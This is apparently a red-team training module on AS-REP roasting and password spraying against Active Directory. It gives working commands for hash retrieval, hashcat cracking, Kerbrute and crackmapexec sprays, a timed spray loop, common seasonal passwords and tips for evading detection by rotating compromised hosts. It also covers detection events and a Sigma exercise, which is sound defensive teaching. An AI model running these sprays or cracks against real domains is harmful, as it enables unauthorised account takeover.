---
title: "AS-REP Roasting and Password Spraying — Unauthenticated Credential Attacks"
tags: [red-team, AS-REP-roasting, password-spraying, Kerberos, pre-authentication,
  Rubeus, Kerbrute, hashcat, ATT&CK, T1558.004, T1110.003]
module: 08-RedTeam-03
day: 515
related_topics:
  - RBCD Attack (Day 514)
  - SID History and Inter-Forest Trust Attacks (Day 516)
  - AD Attack Lab (Day 502)
  - Kerberoasting (Day 502 Path A)
---

# Day 515 — AS-REP Roasting and Password Spraying

> "Both of these attacks target the authentication layer before you have
> a foothold. Password spraying is a seatbelt check — are there accounts
> with the default password, the company name, or last month's season?
> AS-REP roasting is a configuration check — are there accounts that have
> pre-authentication disabled? Either one gives you credentials from
> nothing but network access and a username list. That is the starting
> position you want."
>
> — Ghost

---

## Goals

Understand and execute AS-REP roasting: targeting accounts with Kerberos
pre-authentication disabled.
Understand and execute password spraying: testing one password against many
accounts without triggering lockout.
Crack obtained hashes and tickets offline.
Map both techniques to detection signals and lockout-aware operational timing.

**Prerequisites:** Day 502 (Kerberoasting context), Kerberos fundamentals,
domain user list or username enumeration capability.
**Time budget:** 4 hours.

---

## Part 1 — AS-REP Roasting (T1558.004)

### What Pre-Authentication Is

```
Normal Kerberos AS-REQ (with pre-authentication):
  Client → KDC: "I want a TGT for jsmith"
  Client includes: a timestamp encrypted with jsmith's password hash
  KDC verifies the timestamp → if valid, issues TGT

  Without this check, anyone could request a TGT for any user.

Pre-authentication disabled (vulnerable):
  Client → KDC: "I want a TGT for vpn_service"
  KDC: "OK, here is the AS-REP, encrypted with vpn_service's hash"
  → The attacker receives an AS-REP encrypted with the account's password hash
  → Crack the hash offline → obtain the password
```

### Why Accounts Have Pre-Auth Disabled

```
UserAccountControl flag: DONT_REQ_PREAUTH (0x400000)

Common reasons administrators disable pre-auth:
  → Legacy applications that do not support Kerberos pre-authentication
  → Misconfiguration inherited from old documentation
  → "It was the only way to make the old VPN client work"

Impact: any unauthenticated attacker on the network who knows the account
name can retrieve a crackable hash for that account.
```

### Step 1: Find AS-REP Roastable Accounts

```bash
# Option A: From Kali, unauthenticated (if username list available):
python3 GetNPUsers.py corp.local/ -usersfile usernames.txt \
    -no-pass -dc-ip 10.10.10.5 -format hashcat

# Option B: Authenticated (more complete — finds all roastable accounts):
python3 GetNPUsers.py corp.local/jsmith:'Password123' \
    -request -format hashcat -dc-ip 10.10.10.5 -outputfile asrep_hashes.txt

# Option C: Rubeus from a Windows beacon:
[beacon] > execute-assembly /path/to/Rubeus.exe asreproast /nowrap /format:hashcat

# Output (hashcat format):
# $krb5asrep$23$vpn_service@CORP.LOCAL:A3F2...8C1D
# $krb5asrep$23$svc_noreqauth@CORP.LOCAL:B7E1...2A9F
```

### Step 2: Crack AS-REP Hashes

```bash
# Hashcat mode 18200 = Kerberos 5 AS-REP etype 23 (RC4)
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt \
    --rules-file /usr/share/hashcat/rules/best64.rule

# For AES-256 (etype 18):
# First check: does the account support AES?
# Certipy / Rubeus will show the etype in the output
# Mode for AES256: hashcat -m 19900

# Typically: weak service account passwords crack in seconds to minutes
# Priority targets: service accounts (often have weak, non-expiring passwords)
```

### Lab Setup: Create a Vulnerable Account

```powershell
# On the lab DC:
New-ADUser -Name "vpn_service" -AccountPassword (ConvertTo-SecureString "Summer2024!" -AsPlainText -Force) `
    -Enabled $true -PasswordNeverExpires $true
# Disable pre-authentication:
Set-ADAccountControl vpn_service -DoesNotRequirePreAuth $true
# Verify:
Get-ADUser vpn_service -Properties DoesNotRequirePreAuth | Select DoesNotRequirePreAuth
# → True
```

---

## Part 2 — Password Spraying (T1110.003)

### Why Spraying, Not Brute-Force

```
Brute-force: many passwords against one account
  → Triggers account lockout (typically 5–10 failures)
  → Immediately visible in Event 4625 (failed logon)

Password spraying: one password against many accounts
  → One failure per account → stays below lockout threshold
  → Single Event 4625 per account — appears as a normal failed login
  → Harder to distinguish from legitimate failed logins at low volume

Spray rhythm: must be calibrated to the lockout policy:
  If lockout threshold = 5 failures within 30 minutes:
    → Max 1 attempt per account per 30 minutes
    → Spread attempts: 1 password, all accounts, 60+ minute intervals between passwords
```

### Step 1: Know the Lockout Policy

```bash
# From any authenticated session:
net accounts /domain
# Output includes:
#   Lockout threshold:     5
#   Lockout observation window: 30 minutes
#   Lockout duration:      30 minutes

# Unauthenticated: query LDAP (some DCs allow anonymous LDAP for domain info):
python3 ldapdomaindump.py -u '' -p '' corp.local --no-json --no-html

# If no info available: be conservative
# → 1 spray per 2 hours = safe in nearly all environments
```

### Step 2: Build a Target User List

```bash
# From LDAP (authenticated):
python3 GetADUsers.py corp.local/jsmith:'Password123' -all -dc-ip 10.10.10.5 |
    awk '{print $1}' | tail -n +2 > users.txt

# From OWA autodiscover / enumeration (unauthenticated):
python3 o365creeper.py -f potential_users.txt -o valid_users.txt

# From OSINT (LinkedIn scrape):
# theHarvester -d corp.com -b linkedin → employee names → generate email format
# python3 namemash.py names.txt → first.last / flast / firstl variants
```

### Step 3: Execute the Spray

```bash
# Kerbrute: fast, Kerberos-based, no lockout tracking needed if using AS-REQ:
./kerbrute passwordspray -d corp.local \
    --dc 10.10.10.5 users.txt 'Summer2024!'
# Kerbrute uses AS-REQ — results in Event 4771 (Kerberos pre-auth failed)
# NOT 4625 (NTLM failed logon) — different log source

# Spray with NTLM (SMB):
crackmapexec smb 10.10.10.5 -u users.txt -p 'Summer2024!' \
    --continue-on-success --no-bruteforce
# Shows: [+] CORP\jdoe:Summer2024! (Pwned!) for any successful auth

# Spray via OWA (Exchange):
python3 ruler.py --domain corp.local --brute \
    --users users.txt --passwords 'Summer2024!' --delay 0 --verbose

# Spray timing — one password per session:
for password in 'Summer2024!' 'Welcome1!' 'Corp2024!' 'Password1'; do
    echo "Spraying: $password"
    crackmapexec smb 10.10.10.5 -u users.txt -p "$password" --no-bruteforce 2>/dev/null | grep '+'
    sleep 7200   # 2-hour wait between passwords
done
```

### High-Value Spray Targets

```
Default / seasonal passwords to try (in order of success rate):
  [Season][Year]!          → Summer2024!, Winter2024!, Spring2025!
  [Company][Year]!         → CorpLab2024!, Corp2024!
  Welcome1! / Welcome@1    → Default new-user password in many orgs
  Password1 / P@ssw0rd     → Classic weak passwords
  [Month][Year]!           → January2024!, March2025!
  [CompanyName]@123        → CorpLab@123
  [Domain prefix]1234      → Corplab1234

Target priority:
  1. Service accounts (often set with default passwords, never changed)
  2. Legacy accounts (old employee accounts, disabled but re-enabled)
  3. Shared accounts (IT team, helpdesk — password known by multiple people)
```

---

## Part 3 — Post-Compromise with Sprayed Credentials

```bash
# Verify obtained credential:
crackmapexec smb 10.10.10.5 -u jdoe -p 'Summer2024!'
# [+] CORP\jdoe:Summer2024! (Pwned!) means local admin on DC → likely DA

crackmapexec smb 10.10.10.5 -u jdoe -p 'Summer2024!' --shares
# Check accessible shares

# Run full AD enumeration:
python3 GetADUsers.py corp.local/jdoe:'Summer2024!' -all -dc-ip 10.10.10.5

# Check if account has special privileges:
python3 GetUserSPNs.py corp.local/jdoe:'Summer2024!' -dc-ip 10.10.10.5 -request
# → Kerberoast any SPNs accessible to this account

# Run BloodHound with new credentials:
[beacon] > execute-assembly /path/to/SharpHound.exe -c All \
    --LdapUsername jdoe --LdapPassword 'Summer2024!' --zipfilename new_data.zip
```

---

## Detection and Operational Counters

### Detection

```
AS-REP Roasting:
  Event 4768: Kerberos AS-REQ
    Pre-Authentication Type: 0 (no pre-auth — should never occur for normal accounts)
  Alert: any 4768 with PreAuthType=0 is a roastable account being exploited

Password Spraying (NTLM):
  Event 4625: Failed logon
    Logon Type: 3 (network)
    SubStatus: 0xC000006A (wrong password, account exists)
  Detection: volume-based — N failed logins for different accounts from one source IP
  Threshold example: >20 unique accounts failed within 30 minutes from one IP

Password Spraying (Kerberos/Kerbrute):
  Event 4771: Kerberos pre-authentication failed
    Error Code: 0x18 (wrong password)
  Same volume detection as above but in Kerberos events
```

### Staying Below Detection Thresholds

```
Know the threshold: net accounts /domain
  → Lockout after 5 attempts in 30 minutes
  → Your spray: 1 attempt per account, 60-minute minimum between rounds

Volume: how many accounts to spray?
  → Large spray (1000 accounts at once): generates 1000 Event 4625 in seconds
    → Volume anomaly fires immediately
  → Slow spray (50 accounts per hour): volume is low enough to blend with
    legitimate failed logins from users who forgot their passwords

Source IP: rotate if possible
  → Multiple compromised hosts → distribute the spray
  → Each host does a subset of users → no single source IP triggers volume alert

Timing: avoid overnight or weekend sprays
  → Low-traffic periods make any authentication anomaly more visible
  → Spray during business hours when legitimate failed logins are highest
```

---

## ATT&CK Mapping

| Technique | ATT&CK ID | Detection signal |
|---|---|---|
| AS-REP Roasting | T1558.004 | Event 4768 with PreAuthType=0 |
| Password Spraying | T1110.003 | Volume of 4625/4771 per source IP |
| Valid Account Use | T1078.002 | Successful auth from new source IP |

---

## Key Takeaways

1. AS-REP roasting works against accounts where a single AD checkbox is
   unchecked. Run `GetNPUsers.py` against every new AD environment before
   any other attack — it requires no credentials and reveals crackable hashes.
2. Password spraying is calibrated to the lockout policy. Never spray without
   knowing the threshold. One extra request per account triggers lockout and
   alerts the SOC.
3. Seasonal passwords (Summer2024!) succeed in a majority of environments
   because password complexity policies require uppercase, number, and special
   character — but not resistance to predictable patterns.
4. Kerbrute uses Kerberos (Event 4771) not NTLM (4625). Many SOC rules watch
   only Event 4625 for spray detection. Know which log source your spray
   generates and verify the client's detection covers it.
5. Any credential obtained via spraying or AS-REP roasting is a starting
   position. Immediately run BloodHound with those credentials to find the
   attack path to DA. Do not stop at "I have an account."

---

## Exercises

1. Create a lab account with `DoesNotRequirePreAuth = $true`. Run
   `GetNPUsers.py` unauthenticated with a username list that includes the
   account. Verify the AS-REP hash is returned. Crack it with hashcat.
2. Configure the lab AD lockout policy: 5 attempts in 10 minutes. Execute a
   password spray with Kerbrute against 10 accounts. Verify that Event 4771
   fires but no lockout occurs (one attempt per account).
3. Write a Sigma rule for Event 4768 with `PreAuthType = 0x00`. Verify it
   fires when you request an AS-REP for the vulnerable account.
4. Build a spray timing script that reads a user list and sends exactly one
   spray attempt per account per hour, logging each attempt and result.
   Test it against the lab AD and verify no lockout occurs.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q515.1, Q515.2 …).

---

## Navigation

← Previous: [Day 514 — RBCD Attack](DAY-0514-RBCD-Attack.md)
→ Next: [Day 516 — SID History and Inter-Forest Trust Attacks](DAY-0516-SID-History-Trust-Attacks.md)
